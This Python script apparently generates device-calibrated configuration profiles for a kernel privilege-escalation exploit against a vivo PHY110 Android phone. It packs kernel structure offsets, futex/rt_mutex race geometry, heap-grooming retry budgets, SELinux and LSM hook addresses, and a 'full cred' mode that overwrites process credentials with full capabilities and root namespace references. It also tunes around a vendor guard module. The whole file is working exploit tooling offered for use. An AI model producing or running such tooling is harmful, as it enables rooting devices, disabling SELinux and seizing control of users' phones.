"""Generate a device-calibrated GLK1 profile for a new PHY110 build.

Reuses the geometry that was calibrated and verified on the reference device
(16.0.9.400 / 6.1.141-android14-11-o-g984c12362a16) and swaps in the symbol
offsets of the new build:

  * task_struct / cred / rt_mutex_waiter layouts .... identical across builds
    (BTF-verified: 15/15 task fields, cred caps@48, waiter task@0x30 lock@0x38)
  * punch geometry (rt_sigreturn frame, futex waiter depth) ... identical
    (normalized disassembly of __arm64_sys_rt_sigreturn / futex_wait_requeue_pi /
    rt_mutex_* is instruction-for-instruction identical across the builds)
  * kernel phys layout 0xa8000000 / 0x80000000 ........ inherited (same device,
    same bootloader load address, same DRAM base)
  * symbol offsets ................................... per build (kallsyms)

Usage: python gen_glk1_new_build.py <symbols.json> <release> <out.glk1>
           [--waiter-off N] [--buffer N] [--task-off N] [--lock-off N]

Geometry defaults are the values calibrated on the reference device. Pass the
four flags to use geometry derived from a new image (tools/derive_punch.py).
"""
import json
import struct
import sys

BASE = 0xFFFFFFC008000000

# --- geometry verified identical across builds (see docstring) ---
TASK = {
    "prio": 132, "normal_prio": 140, "sched_task_group": 840, "pi_lock": 2340,
    "pi_waiters": 2360, "pi_top_task": 2376, "pi_blocked_on": 2384, "pid": 1584,
    "tgid": 1588, "atomic_flags": 1520, "real_cred": 2096, "cred": 2104,
    "comm": 2120, "tasks": 1360, "seccomp": 2304,
}
CRED = {
    "copy_size": 80, "usage_offset": 0, "usage_value": 256, "caps_offset": 48,
    "caps_count": 3, "caps_value": -1, "ref_count": 0,
}
KERNEL = {
    "kernel_phys_load": 0xA8000000, "kernel_phys_offset": 0x80000000,
    "compact_waiter": 1, "kernelsnitch_collisions": 4, "mm_struct_sz": 1024,
}
EXEC_CPUS = {"main": 5, "consumer": 6}
# NOTE: prepare_max_attempts was 4 in the device-calibrated profile. The 16.0.5.702
# field test (2026-10-18) failed after 4 attempts: two wasted on collision-detection
# misses and two on the ~50% "even byte over selinux_state.initialized" page rejection
# — the reference device itself only passed on attempt 4 of 4. Raise the budget; this
# is a retry count only and changes no geometry.
EXEC_HEAP = {"prepare_max_attempts": 12, "prepare_timeout_ms": 240000, "kernelsnitch_timeout_ms": 60000}
EXEC_RACE = {"route_wait_ms": 1000, "route_done_timeout_ms": 300000, "setup_settle_us": 50000, "state_poll_interval_us": 1000}
EXEC_STAGES = {"w1_attempts": 15, "w1_settle_us": 100000, "w1_scratch_repair_attempts": 3,
               "w2_attempts": 15, "w2_settle_us": 100000, "w3_chain_rounds": 3,
               "w3_attempts": 6, "w3_settle_us": 50000}
EXEC_HANDOFF = {"pre_dispatch_settle_ms": 2000, "module_poll_attempts": 30,
                "module_poll_interval_ms": 100, "enforce_poll_attempts": 200,
                "enforce_poll_interval_ms": 100}
EXEC_CONSUMER = {"max_calls": 1, "burst_calls": 1}
OPTIONAL_ROUTE_KEYS = ("attempts", "arm_sequence", "arm_hold")
ROUTE = {"waiter_off": 232, "buffer_size": 512, "task_offset": 48, "lock_offset": 56,
         # Lottery knobs: 0 means "omit" so a profile keeps the historical single
         # punch. multicast-only profiles set 128/16/20000 (official vivo values).
         "attempts": 0, "arm_sequence": 0, "arm_hold": 0}


def off(syms, name, delta=0, base=BASE):
    v = syms.get(name)
    if v is None:
        sys.exit(f"FATAL: symbol {name} missing")
    return int(v, 16) - base + delta


def full_cred_from(syms):
    """完整 cred 拷贝：copy_size=sizeof(cred)=0xb0、caps=(1<<41)-1、4 个引用指回 init 对象。
    与另一会话实机验证过的 GT5 Pro profile 同款（PHY110 验证过的是最小覆盖版）。"""
    cred = dict(CRED)
    cred.update({
        "copy_size": 176,
        "caps_value": (1 << 41) - 1,
        "ref_count": 4,
        "ref0_offset": 128, "ref1_offset": 136, "ref2_offset": 144, "ref3_offset": 152,
    })
    refs = [("ref0_image", "root_user"), ("ref1_image", "init_user_ns"),
            ("ref2_image", "init_ucounts"), ("ref3_image", "init_groups")]
    for key, sym in refs:
        v = syms.get(sym)
        if v is None:
            sys.exit(f"FATAL: full-cred 需要符号 {sym}，但符号表里没有")
        val = int(v, 16)
        if val >= 1 << 63:              # GLK1 用有符号 int64 存地址
            val -= 1 << 64
        cred[key] = val
    return cred


def build(symf, release, out, geometry=None, full_cred=False, loggers_delta=8,
          phys=None, structs_json=None, cpus=None, collisions=None,
          cred_usage=None, caps_count=None, caps_value=None,
          vr_tp=None, vr_funcs=0x40):
    syms = json.load(open(symf, encoding="utf-8"))
    base = int(syms["_text"], 16) if "_text" in syms else BASE   # 16K 页内核基址不同
    major = int(release.split(".")[0]) if release and release[0].isdigit() else 6
    mm_sz = None
    task = dict(TASK)
    cred_extra = {}
    waiter = {}
    if structs_json:
        sj = json.load(open(structs_json, encoding="utf-8"))
        f = sj.get("fields", sj)
        for k in ("prio", "normal_prio", "sched_task_group", "pi_lock", "pi_waiters",
                  "pi_top_task", "pi_blocked_on", "pid", "tgid", "atomic_flags",
                  "real_cred", "cred", "comm", "tasks", "seccomp"):
            if f.get(k) is not None:
                task[k] = f[k]
        # 注意：cred_size 是 sizeof(struct cred)（供 --full-cred 用），
        # 不能拿它当最小覆盖的 copy_size —— 最小覆盖只到 caps 末尾。
        cred_extra = {
            "usage_offset": f.get("cred_usage") if f.get("cred_usage") is not None else CRED["usage_offset"],
            "caps_offset": f.get("cred_caps") if f.get("cred_caps") is not None else CRED["caps_offset"],
        }
        waiter = {"task_offset": f.get("waiter_task"), "lock_offset": f.get("waiter_lock")}
        # kernelsnitch 用 slab 对象步长：mm_struct cache 是 SLAB_HWCACHE_ALIGN，
        # 所以是 sizeof(struct mm_struct) 向上取整到 128B（960→1024 实测吻合）
        if f.get("mm_struct_size"):
            mm_sz = (int(f["mm_struct_size"]) + 0x7F) & ~0x7F
    route = dict(ROUTE)
    if geometry:
        for k, v in geometry.items():
            if v is not None:
                route[k] = v
    cred = full_cred_from(syms) if full_cred else dict(CRED)
    if cred_usage is not None:
        cred["usage_value"] = cred_usage
    if caps_count is not None:
        cred["caps_count"] = caps_count
    if caps_value is not None:
        cred["caps_value"] = caps_value
    for k, v in cred_extra.items():
        if v is not None:
            cred[k] = v
    if waiter.get("task_offset") is not None:
        route["task_offset"] = waiter["task_offset"]
    if waiter.get("lock_offset") is not None:
        route["lock_offset"] = waiter["lock_offset"]
    kernel = dict(KERNEL)
    if mm_sz:
        kernel["mm_struct_sz"] = mm_sz
    if collisions is not None:
        kernel["kernelsnitch_collisions"] = collisions
    if vr_tp:
        kernel["vr_tracepoint_funcs"] = (vr_funcs if isinstance(vr_funcs, int)
                                         else int(vr_funcs, 0))
    if phys is not None:
        if phys == "none":
            kernel.pop("kernel_phys_load", None)
            kernel.pop("kernel_phys_offset", None)
        else:
            load, offv = phys
            kernel["kernel_phys_load"] = load
            kernel["kernel_phys_offset"] = offv
    offsets = {
        "init_task": off(syms, "init_task", base=base),
        "init_cred": off(syms, "init_cred", base=base),
        "empty_zero_page": off(syms, "empty_zero_page", base=base),
        "root_task_group": off(syms, "root_task_group", base=base),
        "selinux_enforcing": off(syms, "selinux_state", base=base),
        "selinux_blob_sizes": off(syms, "selinux_blob_sizes", base=base),
        "security_hook_heads": off(syms, "security_hook_heads", base=base),
        "slide_nfulnl_logger": off(syms, "nfulnl_logger", base=base),
        "slide_loggers_0_1": off(syms, "loggers", loggers_delta, base=base),
        "slide_boot_id": off(syms, "sysctl_bootid", base=base),
    }
    # vivo vr.ko guard: __tracepoint_sys_exit + offsetof(struct tracepoint, funcs).
    # Only written when asked, so non-vivo profiles keep their exact bytes.
    if vr_tp == "auto":
        if "__tracepoint_sys_exit" in syms:
            offsets["vr_sys_exit_tp"] = off(syms, "__tracepoint_sys_exit", base=base)
    elif vr_tp:
        offsets["vr_sys_exit_tp"] = int(vr_tp, 0)

    sections = [
        ("meta", {"kernel_major": major, "recommend_shizuku": 0, "fallback_route": 0,
                  "safe_mode": 0}),
        ("task_struct", task),
        ("cred", cred),
        ("offset", offsets),
        ("kernel", kernel),
        ("execution.recommended_cpus", dict(cpus or EXEC_CPUS)),
        ("execution.heap", EXEC_HEAP),
        ("execution.race", EXEC_RACE),
        ("execution.stages", EXEC_STAGES),
        ("execution.handoff", EXEC_HANDOFF),
        ("execution.consumer", EXEC_CONSUMER),
        ("route.multicast_waiter",
         {k: v for k, v in route.items() if not (k in OPTIONAL_ROUTE_KEYS and not v)}),
    ]
    rel = release.encode()
    out_bytes = struct.pack("<IHHHHHH", 0x0D000721, 2, 1, 1, 3, len(rel), 0)
    out_bytes += rel
    out_bytes += struct.pack("<H", len(sections))
    for name, entries in sections:
        nb = name.encode()
        out_bytes += struct.pack("<B", len(nb)) + nb
        out_bytes += struct.pack("<I", len(entries))
        for k, v in entries.items():
            kb = k.encode()
            out_bytes += struct.pack("<B", len(kb)) + kb
            out_bytes += struct.pack("<q", v)

    open(out, "wb").write(out_bytes)
    print(f"wrote {out} ({len(out_bytes)} bytes)")
    print(f"  release: {release}")
    print(f"  route.multicast_waiter: waiter_off={route['waiter_off']:#x} "
          f"buffer={route['buffer_size']:#x} task={route['task_offset']:#x} "
          f"lock={route['lock_offset']:#x}")
    if route.get("attempts"):
        print(f"  lottery: attempts={route['attempts']} arm_seq={route['arm_sequence']} "
              f"arm_hold={route['arm_hold']}")
    for k, v in offsets.items():
        print(f"    {k:24s} {v:#x}")
    return offsets


if __name__ == "__main__":
    argv = sys.argv[1:]
    if len(argv) < 3:
        sys.exit(__doc__)
    geo = {"waiter_off": None, "buffer_size": None,
           "task_offset": None, "lock_offset": None}
    flags = {"--waiter-off": "waiter_off", "--buffer": "buffer_size",
             "--task-off": "task_offset", "--lock-off": "lock_offset",
             "--mcast-attempts": "attempts", "--mcast-arm-seq": "arm_sequence",
             "--mcast-arm-hold": "arm_hold"}
    full_cred = False
    loggers_delta = 8
    phys = None
    structs_json = None
    cpus = None
    collisions = None
    cred_usage = None
    caps_count = None
    caps_value = None
    vr_tp = None
    vr_funcs = 0x40
    rest = []
    i = 0
    while i < len(argv):
        a = argv[i]
        if a == "--vr-tp":
            vr_tp = argv[i + 1]; i += 2
        elif a == "--vr-funcs":
            vr_funcs = int(argv[i + 1], 0); i += 2
        elif a in flags:
            geo[flags[a]] = int(argv[i + 1], 0); i += 2
        elif a == "--full-cred":
            full_cred = True; i += 1
        elif a == "--loggers-delta":
            loggers_delta = int(argv[i + 1], 0); i += 2
        elif a == "--structs-json":
            structs_json = argv[i + 1]; i += 2
        elif a == "--cpus":
            m, c = argv[i + 1].split(",")
            cpus = {"main": int(m, 0), "consumer": int(c, 0)}
            i += 2
        elif a == "--cred-usage":
            cred_usage = int(argv[i + 1], 0); i += 2
        elif a == "--caps-value":
            caps_value = int(argv[i + 1], 0); i += 2
        elif a == "--caps-count":
            caps_count = int(argv[i + 1], 0); i += 2
        elif a == "--collisions":
            collisions = int(argv[i + 1], 0); i += 2
        elif a == "--phys":
            phys = "none" if argv[i + 1] == "none" else (int(argv[i + 1], 0), int(argv[i + 2], 0))
            i += 2 if phys == "none" else 3
        else:
            rest.append(a); i += 1
    if len(rest) != 3:
        sys.exit(__doc__)
    build(rest[0], rest[1], rest[2], geo, full_cred, loggers_delta, phys, structs_json,
          cpus, collisions, cred_usage, caps_count, caps_value,
          vr_tp, vr_funcs)
